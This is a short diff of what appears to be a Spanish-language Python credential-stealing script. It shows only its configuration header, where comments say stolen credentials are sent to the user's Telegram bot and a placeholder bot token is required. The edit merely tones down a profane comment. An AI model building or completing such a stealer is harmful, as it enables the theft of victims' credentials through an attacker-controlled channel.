@@ -20,7 +20,7 @@ import sys
 import os
 import json
 
-# --- CONFIGURACIÓN DEL BOT DE TELEGRAM (¡Pon la mierda que te dio BotFather!) ---
+# --- CONFIGURACIÓN DEL BOT DE TELEGRAM (¡Pon lo que te dio BotFather!) ---
 # Esto es donde tus trofeos (las credenciales robadas) aterrizarán.
 # Asegúrate de que el bot está activo y que tu chat ID es el correcto.
 BOT_TOKEN = "PON_AQUÍ_EL_TOKEN_DE_TU_BOT" # <<< ¡OBLIGATORIO! Si no, no robas nada.
